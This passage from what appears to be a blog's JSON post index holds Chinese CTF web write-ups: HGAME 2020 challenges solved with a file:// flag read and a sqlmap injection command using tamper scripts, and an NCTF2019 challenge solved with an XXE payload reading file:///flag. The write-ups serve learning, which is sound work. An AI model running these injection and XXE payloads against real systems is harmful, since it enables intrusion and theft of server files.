base64_encode(file_get_contents(\"static/error.jpg\")); ?\u003e'\u003e\r\u003c/div\u003e\r\u003c/fieldset\u003e\r\u003c/body\u003e\r\u003c/html\u003e\r看到有一个过滤:\n于是：\nfile://localhost/flag\raGdhbWV7cEhwXzFzX1RoM19CM3NUX0w0bkd1NGdFIUAhfQo=\rbase64解码：\nhgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}\nCosmos的留言板 最开始没有发现什么思路，后来是用kali下的sqlmap扫了出来，这里要用到sqlmap的tamper\n这里就直接上playload:\nsqlmap -u \"http://139.199.182.61/index.php?id=1\" -D easysql -T f1aggggggggggggg -C fl4444444g --dump --tamper \"randomcase.py,space2comment.py\"\rhgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}\n","description":"Vidar team主办的比赛","tags":null,"title":"HGAME 2020_Web","uri":"/posts/hgame2020_web/"},{"categories":["ctf_writeup"],"content":"NCTF2019web1:fake xml cookbook_writeup\nBy:0xfxxker_wh1sper\n解题思路：\n这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。\n用户名，密码随便试一下：\n抓包，分析:\n于是我构造了如下XML外部实体，大概是这样\n注意事项：\n\u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE dy（这里有一个空格） [\r\u003c!ENTITY dy SYSTEM \"file:///flag\"\u003e\r]\u003e\r\u003cuser\u003e\u003cusername\u003e\u0026dy;（分号）\u003c/username\u003e\u003cpassword\u003e123\u003c/password\u003e\u003c/user\u003e\r通过POST请求发过去\n服务器说登录失败，并且返回\u0026dy，也就是/flag的内容\n这里挂一篇关于xxe的学习文档：http://url.cn/54Ucm5w\n","description":"南京邮电大学举办的比赛，也是我和队友命运交织的地方。虽然题目做的不多，但是这场比赛深深的影响到了我，让我爱上了web安全","tags":["XXE"],"title":"NCTF2019_Fakexml_cookbook","uri":"/posts/nctf2019_fakexml/"}]
